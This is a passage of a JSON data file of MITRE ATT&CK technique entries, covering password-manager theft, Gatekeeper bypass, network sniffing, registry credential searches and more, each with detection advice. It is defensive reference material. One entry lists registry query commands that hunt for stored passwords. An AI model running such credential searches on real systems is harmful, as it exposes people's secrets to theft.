      "description": "Adversaries may acquire user credentials from third-party password managers.(Citation: ise Password Manager February 2019) Password managers are applications designed to store user credentials, normally in an encrypted database. Credentials are typically accessible after a user provides a master password that unlocks the database. After the database is unlocked, these credentials may be copied to memory. These databases can be stored as files on disk.(Citation: ise Password Manager February 2019)\n\nAdversaries may acquire user credentials from password managers by extracting the master password and/or plain-text credentials from memory.(Citation: FoxIT Wocao December 2019)(Citation: Github KeeThief) Adversaries may extract credentials from memory via [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212).(Citation: NVD CVE-2019-3610)\n Adversaries may also try brute forcing via [Password Guessing](https://attack.mitre.org/techniques/T1110/001) to obtain the master password of a password manager.(Citation: Cyberreason Anchor December 2019)",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1555.005",
      "stix_id": "attack-pattern--315f51f0-6b03-4c1e-bfb2-84740afb8e21",
      "created": "2021-01-22T16:08:40.629000+00:00",
      "modified": "2025-04-15T22:56:22.300000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Access",
        "Process: OS API Execution",
        "File: File Access",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Consider monitoring API calls, file read events, and processes for suspicious activity that could indicate searching in process memory of password managers. \n\nConsider monitoring file reads surrounding known password manager applications."
    },
    "T1553.001": {
      "id": "T1553.001",
      "name": "Gatekeeper Bypass",
      "description": "Adversaries may modify file attributes and subvert Gatekeeper functionality to evade user prompts and execute untrusted programs. Gatekeeper is a set of technologies that act as layer of Apple\u2019s security model to ensure only trusted applications are executed on a host. Gatekeeper was built on top of File Quarantine in Snow Leopard (10.6, 2009) and has grown to include Code Signing, security policy compliance, Notarization, and more. Gatekeeper also treats applications running for the first time differently than reopened applications.(Citation: TheEclecticLightCompany Quarantine and the flag)(Citation: TheEclecticLightCompany apple notarization )\n\nBased on an opt-in system, when files are downloaded an extended attribute (xattr) called `com.apple.quarantine` (also known as a quarantine flag) can be set on the file by the application performing the download. Launch Services opens the application in a suspended state. For first run applications with the quarantine flag set, Gatekeeper executes the following functions:\n\n1. Checks extended attribute \u2013 Gatekeeper checks for the quarantine flag, then provides an alert prompt to the user to allow or deny execution.(Citation: OceanLotus for OS X)(Citation: 20 macOS Common Tools and Techniques)\n\n2. Checks System Policies - Gatekeeper checks the system security policy, allowing execution of apps downloaded from either just the App Store or the App Store and identified developers.\n\n3. Code Signing \u2013 Gatekeeper checks for a valid code signature from an Apple Developer ID.\n\n4. Notarization - Using the `api.apple-cloudkit.com` API, Gatekeeper reaches out to Apple servers to verify or pull down the notarization ticket and ensure the ticket is not revoked. Users can override notarization, which will result in a prompt of executing an \u201cunauthorized app\u201d and the security policy will be modified.\n\nAdversaries can subvert one or multiple security controls within Gatekeeper checks through logic errors (e.g. [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211)), unchecked file types, and external libraries. For example, prior to macOS 13 Ventura, code signing and notarization checks were only conducted on first launch, allowing adversaries to write malicious executables to previously opened applications in order to bypass Gatekeeper security checks.(Citation: theevilbit gatekeeper bypass 2021)(Citation: Application Bundle Manipulation Brandon Dalton)\n\nApplications and files loaded onto the system from a USB flash drive, optical disk, external hard drive, from a drive shared over the local network, or using the curl command may not set the quarantine flag. Additionally, it is possible to avoid setting the quarantine flag using [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1553.001",
      "stix_id": "attack-pattern--31a0a2ac-c67c-4a7e-b9ed-6a96477d4e8e",
      "created": "2020-02-05T16:16:08.471000+00:00",
      "modified": "2025-04-16T20:37:16.087000+00:00",
      "platforms": [
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Command: Command Execution",
        "File: File Metadata",
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": "The removal of the <code>com.apple.quarantine</code> flag by a user instead of the operating system is a suspicious action and should be examined further. Monitor and investigate attempts to modify extended file attributes with utilities such as <code>xattr</code>. Built-in system utilities may generate high false positive alerts, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible. Monitor software update frameworks that strip the <code>com.apple.quarantine</code> flag when performing updates. \n\nReview <code>false</code> values under the <code>LSFileQuarantineEnabled</code> entry in an application's <code>Info.plist</code> file (required by every application). <code>false</code> under <code>LSFileQuarantineEnabled</code> indicates that an application does not use the quarantine flag. Unsandboxed applications with an unspecified <code>LSFileQuarantineEnabled</code> entry will default to not setting the quarantine flag. \n\nQuarantineEvents is a SQLite database containing a list of all files assigned the <code>com.apple.quarantine</code> attribute, located at <code>~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2</code>. Each event contains the corresponding UUID, timestamp, application, Gatekeeper score, and decision if it was allowed.(Citation: TheEclecticLightCompany Quarantine and the flag)"
    },
    "T1675": {
      "id": "T1675",
      "name": "ESXi Administration Command",
      "description": "Adversaries may abuse ESXi administration services to execute commands on guest machines hosted within an ESXi virtual environment. Persistent background services on ESXi-hosted VMs, such as the VMware Tools Daemon Service, allow for remote management from the ESXi server. The tools daemon service runs as `vmtoolsd.exe` on Windows guest operating systems, `vmware-tools-daemon` on macOS, and `vmtoolsd ` on Linux.(Citation: Broadcom VMware Tools Services) \n\nAdversaries may leverage a variety of tools to execute commands on ESXi-hosted VMs \u2013 for example, by using the vSphere Web Services SDK to programmatically execute commands and scripts via APIs such as `StartProgramInGuest`, `ListProcessesInGuest`,  `ListFileInGuest`, and `InitiateFileTransferFromGuest`.(Citation: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)(Citation: Broadcom Running Guest OS Operations) This may enable follow-on behaviors on the guest VMs, such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083), [Data from Local System](https://attack.mitre.org/techniques/T1005), or [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). ",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1675",
      "stix_id": "attack-pattern--31e5011f-090e-45be-9bb6-17a1c5e8219b",
      "created": "2025-03-28T14:01:52.810000+00:00",
      "modified": "2025-04-16T14:57:47.078000+00:00",
      "platforms": [
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Application Log: Application Log Content"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1608.004": {
      "id": "T1608.004",
      "name": "Drive-by Target",
      "description": "Adversaries may prepare an operational environment to infect systems that visit a website over the normal course of browsing. Endpoint systems may be compromised through browsing to adversary controlled sites, as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). In such cases, the user's web browser is typically targeted for exploitation (often not requiring any extra user interaction once landing on the site), but adversaries may also set up websites for non-exploitation behavior such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001). Prior to [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), adversaries must stage resources needed to deliver that exploit to users who browse to an adversary controlled site. Drive-by content can be staged on adversary controlled infrastructure that has been acquired ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or previously compromised ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).\n\nAdversaries may upload or inject malicious web content, such as [JavaScript](https://attack.mitre.org/techniques/T1059/007), into websites.(Citation: FireEye CFR Watering Hole 2012)(Citation: Gallagher 2015) This may be done in a number of ways, including:\n\n* Inserting malicious scripts into web pages or other user controllable web content such as forum posts\n* Modifying script files served to websites from publicly writeable cloud storage buckets\n* Crafting malicious web advertisements and purchasing ad space on a website through legitimate ad providers (i.e., [Malvertising](https://attack.mitre.org/techniques/T1583/008))\n\nIn addition to staging content to exploit a user's web browser, adversaries may also stage scripting content to profile the user's browser (as in [Gather Victim Host Information](https://attack.mitre.org/techniques/T1592)) to ensure it is vulnerable prior to attempting exploitation.(Citation: ATT ScanBox)\n\nWebsites compromised by an adversary and used to stage a drive-by may be ones visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is referred to a strategic web compromise or watering hole attack.\n\nAdversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure ([Domains](https://attack.mitre.org/techniques/T1583/001)) to help facilitate [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1608.004",
      "stix_id": "attack-pattern--31fe0ba2-62fd-4fd9-9293-4043d84f7fe9",
      "created": "2021-03-17T20:33:20.127000+00:00",
      "modified": "2025-04-15T22:24:03.854000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Internet Scan: Response Content"
      ],
      "defense_bypassed": [],
      "detection": "If infrastructure or patterns in the malicious web content utilized to deliver a [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) have been previously identified, internet scanning may uncover when an adversary has staged web content for use in a strategic web compromise.\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on other phases of the adversary lifecycle, such as [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203)."
    },
    "T1007": {
      "id": "T1007",
      "name": "System Service Discovery",
      "description": "Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such as <code>sc query</code>, <code>tasklist /svc</code>, <code>systemctl --type=service</code>, and <code>net start</code>.\n\nAdversaries may use the information from [System Service Discovery](https://attack.mitre.org/techniques/T1007) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1007",
      "stix_id": "attack-pattern--322bad5a-1c49-4d23-ab79-76d641794afa",
      "created": "2017-05-31T21:30:21.315000+00:00",
      "modified": "2025-04-15T23:14:33.837000+00:00",
      "platforms": [
        "Windows",
        "macOS",
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Process: Process Creation",
        "Process: OS API Execution"
      ],
      "defense_bypassed": [],
      "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001)."
    },
    "T1040": {
      "id": "T1040",
      "name": "Network Sniffing",
      "description": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)\n\nOn network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1040",
      "stix_id": "attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529",
      "created": "2017-05-31T21:30:41.399000+00:00",
      "modified": "2025-04-15T19:58:19.739000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Network Devices",
        "IaaS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Detecting the events leading up to sniffing network traffic may be the best method of detection. From the host level, an adversary would likely need to perform a [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) attack against other devices on a wired network in order to capture traffic that was not to or from the current compromised system. This change in the flow of information is detectable at the enclave network level. Monitor for ARP spoofing and gratuitous ARP broadcasts. Detecting compromised network devices is a bit more challenging. Auditing administrator logins, configuration changes, and device images is required to detect malicious changes.\n\nIn cloud-based environments, monitor for the creation of new traffic mirrors or modification of existing traffic mirrors. For network infrastructure devices, collect AAA logging to monitor for the capture of network traffic."
    },
    "T1553.002": {
      "id": "T1553.002",
      "name": "Code Signing",
      "description": "Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) The certificates used during an operation may be created, acquired, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates) Unlike [Invalid Code Signature](https://attack.mitre.org/techniques/T1036/001), this activity will result in a valid signature.\n\nCode signing to verify software on first run can be used on modern Windows and macOS systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing)(Citation: EclecticLightChecksonEXECodeSigning)\n\nCode signing certificates may be used to bypass security policies that require signed code to execute on a system. ",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1553.002",
      "stix_id": "attack-pattern--32901740-b42c-4fdd-bc02-345b5dc57082",
      "created": "2020-02-05T16:27:37.784000+00:00",
      "modified": "2025-04-16T20:37:16.240000+00:00",
      "platforms": [
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Metadata"
      ],
      "defense_bypassed": [],
      "detection": "Collect and analyze signing certificate metadata on software that executes within the environment to look for unusual certificate characteristics and outliers."
    },
    "T1530": {
      "id": "T1530",
      "name": "Data from Cloud Storage",
      "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
      "tactic": "collection",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1530",
      "stix_id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
      "created": "2019-08-30T18:07:27.741000+00:00",
      "modified": "2025-04-15T22:15:26.889000+00:00",
      "platforms": [
        "IaaS",
        "SaaS",
        "Office Suite"
      ],
      "permissions_required": [],
      "data_sources": [
        "Cloud Service: Cloud Service Metadata",
        "Cloud Storage: Cloud Storage Access"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for unusual queries to the cloud provider's storage service. Activity originating from unexpected sources may indicate improper permissions are set that is allowing access to data. Additionally, detecting failed attempts by a user for a certain object, followed by escalation of privileges by the same user, and access to the same object may be an indication of suspicious activity."
    },
    "T1565.003": {
      "id": "T1565.003",
      "name": "Runtime Data Manipulation",
      "description": "Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nAdversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct [Change Default File Association](https://attack.mitre.org/techniques/T1546/001) and [Masquerading](https://attack.mitre.org/techniques/T1036) to cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
      "tactic": "impact",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1565.003",
      "stix_id": "attack-pattern--32ad5c86-2bcf-47d8-8fdc-d7f3d79a7490",
      "created": "2020-03-02T14:30:05.252000+00:00",
      "modified": "2025-04-15T23:01:11.644000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Modification",
        "File: File Deletion",
        "Process: OS API Execution",
        "File: File Metadata",
        "File: File Creation"
      ],
      "defense_bypassed": [],
      "detection": "Inspect important application binary file hashes, locations, and modifications for suspicious/unexpected values."
    },
    "T1552.002": {
      "id": "T1552.002",
      "name": "Credentials in Registry",
      "description": "Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.\n\nExample commands to find Registry keys related to password information: (Citation: Pentestlab Stored Credentials)\n\n* Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code>\n* Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code>",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1552.002",
      "stix_id": "attack-pattern--341e222a-a6e3-4f6f-b69c-831d792b1580",
      "created": "2020-02-04T12:58:40.678000+00:00",
      "modified": "2025-04-15T19:58:20.405000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Command: Command Execution",
        "Windows Registry: Windows Registry Key Access"
      ],
      "defense_bypassed": [],
      "detection": "Monitor processes for applications that can be used to query the Registry, such as [Reg](https://attack.mitre.org/software/S0075), and collect command parameters that may indicate credentials are being searched. Correlate activity with related suspicious behavior that may indicate an active intrusion to reduce false positives."
    },
    "T1135": {
      "id": "T1135",
      "name": "Network Share Discovery",
      "description": "Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. \n\nFile sharing over a Windows network occurs over the SMB protocol. (Citation: Wikipedia Shared Resource) (Citation: TechNet Shared Folder) [Net](https://attack.mitre.org/software/S0039) can be used to query a remote system for available shared drives using the <code>net view \\\\\\\\remotesystem</code> command. It can also be used to query shared drives on the local system using <code>net share</code>. For macOS, the <code>sharing -l</code> command lists all shared points used for smb services.",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1135",
      "stix_id": "attack-pattern--3489cfc5-640f-4bb3-a103-9137b97de79f",
      "created": "2017-12-14T16:46:06.044000+00:00",
      "modified": "2025-04-15T22:52:30.350000+00:00",
      "platforms": [
        "macOS",
        "Windows",
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: OS API Execution",
        "Command: Command Execution",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001)."
    },
    "T1120": {
      "id": "T1120",
      "name": "Peripheral Device Discovery",
      "description": "Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system.(Citation: Peripheral Discovery Linux)(Citation: Peripheral Discovery macOS) Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1120",
      "stix_id": "attack-pattern--348f1eef-964b-4eb6-bb53-69b3dcb0c643",
      "created": "2017-05-31T21:31:28.471000+00:00",
      "modified": "2025-04-25T15:15:22.038000+00:00",
      "platforms": [
        "Windows",
        "macOS",
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: OS API Execution",
        "Process: Process Creation",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001)."
    },
    "T1036.009": {
      "id": "T1036.009",
      "name": "Break Process Trees",
      "description": "An adversary may attempt to evade process tree-based analysis by modifying executed malware's parent process ID (PPID). If endpoint protection software leverages the \u201cparent-child\" relationship for detection, breaking this relationship could result in the adversary\u2019s behavior not being associated with previous process tree activity. On Unix-based systems breaking this process tree is common practice for administrators to execute software using scripts and programs.(Citation: 3OHA double-fork 2022) \n\nOn Linux systems, adversaries may execute a series of [Native API](https://attack.mitre.org/techniques/T1106) calls to alter malware's process tree. For example, adversaries can execute their payload without any arguments, call the `fork()` API call twice, then have the parent process exit. This creates a grandchild process with no parent process that is immediately adopted by the `init` system process (PID 1), which successfully disconnects the execution of the adversary's payload from its previous process tree.\n\nAnother example is using the \u201cdaemon\u201d syscall to detach from the current parent process and run in the background.(Citation: Sandfly BPFDoor 2022)(Citation: Microsoft XorDdos Linux Stealth 2022) ",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1036.009",
      "stix_id": "attack-pattern--34a80bc4-80f2-46e6-94ff-f3265a4b657c",
      "created": "2023-09-27T19:49:40.815000+00:00",
      "modified": "2025-04-15T21:54:02.243000+00:00",
      "platforms": [
        "Linux",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: OS API Execution",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1590.004": {
      "id": "T1590.004",
      "name": "Network Topology",
      "description": "Adversaries may gather information about the victim's network topology that can be used during targeting. Information about network topologies may include a variety of details, including the physical and/or logical arrangement of both external-facing and internal network environments. This information may also include specifics regarding network devices (gateways, routers, etc.) and other infrastructure.\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about network topologies may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: DNS Dumpster) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1590.004",
      "stix_id": "attack-pattern--34ab90a3-05f6-4259-8f21-621081fdaba5",
      "created": "2020-10-02T15:49:03.815000+00:00",
      "modified": "2025-04-15T22:52:48.199000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    },
    "T1587.002": {
      "id": "T1587.002",
      "name": "Code Signing Certificates",
      "description": "Adversaries may create self-signed code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.(Citation: Wikipedia Code Signing) Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.\n\nPrior to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may develop self-signed code signing certificates for use in operations.",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1587.002",
      "stix_id": "attack-pattern--34b3f738-bd64-40e5-a112-29b0542bc8bf",
      "created": "2020-10-01T01:41:08.652000+00:00",
      "modified": "2025-04-15T22:05:55.035000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Malware Repository: Malware Metadata"
      ],
      "defense_bypassed": [],
      "detection": "Consider analyzing self-signed code signing certificates for features that may be associated with the adversary and/or their developers, such as the thumbprint, algorithm used, validity period, and common name. Malware repositories can also be used to identify additional samples associated with the adversary and identify patterns an adversary has used in crafting self-signed code signing certificates.\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related follow-on behavior, such as [Code Signing](https://attack.mitre.org/techniques/T1553/002) or [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)."
    },
    "T1222.001": {
      "id": "T1222.001",
      "name": "Windows File and Directory Permissions Modification",
      "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nWindows implements file and directory ACLs as Discretionary Access Control Lists (DACLs).(Citation: Microsoft DACL May 2018) Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.(Citation: Microsoft Access Control Lists May 2018)\n\nAdversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders. Further, [PowerShell](https://attack.mitre.org/techniques/T1059/001) provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1222.001",
      "stix_id": "attack-pattern--34e793de-0274-4982-9c1a-246ed1c19dee",
      "created": "2020-02-04T19:17:41.767000+00:00",
      "modified": "2025-04-15T23:21:45.352000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Active Directory: Active Directory Object Modification",
        "Process: Process Creation",
        "File: File Metadata"
      ],
      "defense_bypassed": [],
      "detection": "Monitor and investigate attempts to modify DACLs and file/directory ownership. Many of the commands used to modify DACLs and file/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.\n\nConsider enabling file/directory permission change auditing on folders containing key binary/configuration files. For example, Windows Security Log events (Event ID 4670) are created when DACLs are modified.(Citation: EventTracker File Permissions Feb 2014)"
    },
    "T1137.006": {
      "id": "T1137.006",
      "name": "Add-ins",
